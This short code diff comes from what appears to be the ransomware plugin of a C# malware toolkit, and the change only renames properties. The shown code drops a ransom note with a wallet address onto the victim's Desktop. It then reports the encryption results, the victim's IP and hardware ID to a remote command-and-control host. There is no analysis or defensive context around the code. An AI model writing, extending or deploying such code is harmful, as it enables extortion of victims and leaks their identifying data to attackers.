@@ -171,7 +171,7 @@ namespace Plugin.Operation
 
             File.WriteAllText(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\Notes.txt", this.wallet + Environment.NewLine + Environment.NewLine + this.message);
 
-            Launch.ClientSender(this.loadingAPI.host, this.loadingAPI.key, new RansomwareConfirmationPacket(PacketType.RANSOMWARE_ENCRYPTION_CONFIRMATION, fullResults, this.loadingAPI.baseIp, this.loadingAPI.HWID));
+            Launch.ClientSender(this.loadingAPI.Host, this.loadingAPI.Key, new RansomwareConfirmationPacket(PacketType.RANSOMWARE_ENCRYPTION_CONFIRMATION, fullResults, this.loadingAPI.BaseIp, this.loadingAPI.HWID));
         }
     }
 }
